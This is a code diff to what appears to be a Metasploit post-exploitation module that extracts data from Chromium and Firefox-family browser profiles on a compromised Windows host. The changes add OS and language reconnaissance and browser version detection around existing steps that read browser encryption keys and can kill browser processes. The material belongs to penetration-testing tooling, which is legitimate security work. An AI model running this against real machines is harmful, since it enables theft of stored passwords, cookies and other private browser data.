@@ -56,6 +56,12 @@ class MetasploitModule < Msf::Post
       end
     end
 
+    sysinfo = session.sys.config.sysinfo
+    os = sysinfo['OS']
+    architecture = sysinfo['Architecture']
+    language = sysinfo['System Language']
+    computer = sysinfo['Computer']
+
     user_profile = get_env('USERPROFILE')
     user_account = session.sys.config.getuid
     ip_address = session.sock.peerhost
@@ -65,8 +71,10 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    print_status("Targeting: #{user_account} (#{ip_address}).")
+    print_status("Targeting: #{user_account} (IP: #{ip_address})")
+    print_status("System Information: #{computer} | OS: #{os} | Arch: #{architecture} | Lang: #{language}")
     print_status("Starting data extraction from user profile: #{user_profile}")
+    print_status('')
 
     case datastore['BROWSER_TYPE']
     when 'chromium'
@@ -140,13 +148,23 @@ class MetasploitModule < Msf::Post
       profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
       next unless directory?(profile_path)
 
-      print_status("Found #{name}")
+      browser_version = get_chromium_version("#{base_path}\\AppData\\Local\\#{path}\\User Data\\Last Version")
+      print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
       kill_browser_process(name) if datastore['KILL_BROWSER']
 
       local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
       encryption_key = get_chromium_encryption_key(local_state)
       extract_chromium_data(profile_path, encryption_key, name)
     end
+  end
+
+  def get_chromium_version(last_version_path)
+    return nil unless file?(last_version_path)
+
+    version = read_file(last_version_path).strip
+    return version unless version.empty?
+
+    nil
   end
 
   # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
@@ -170,15 +188,36 @@ class MetasploitModule < Msf::Post
       profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Profiles"
       next unless directory?(profile_path)
 
-      print_status("Found #{name}")
-      kill_browser_process(name) if datastore['KILL_BROWSER']
+      found_browser = false
 
-      session.fs.dir.entries(profile_path).each do |profile|
-        next if profile == '.' || profile == '..'
+      session.fs.dir.entries(profile_path).each do |profile_dir|
+        next if profile_dir == '.' || profile_dir == '..'
 
-        extract_gecko_data("#{profile_path}\\#{profile}", name)
+        prefs_file = "#{profile_path}\\#{profile_dir}\\prefs.js"
+        browser_version = get_gecko_version(prefs_file)
+
+        if !found_browser
+          print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
+          found_browser = true
+        end
+
+        kill_browser_process(name) if datastore['KILL_BROWSER']
+
+        extract_gecko_data("#{profile_path}\\#{profile_dir}", name)
       end
     end
+  end
+
+  def get_gecko_version(prefs_file)
+    return nil unless file?(prefs_file)
+
+    version_line = read_file(prefs_file).lines.find { |line| line.include?('extensions.lastAppVersion') }
+
+    if version_line && version_line =~ /"extensions\.lastAppVersion",\s*"(\d+\.\d+\.\d+)"/
+      return Regexp.last_match(1)
+    end
+
+    nil
   end
 
   def kill_browser_process(browser)
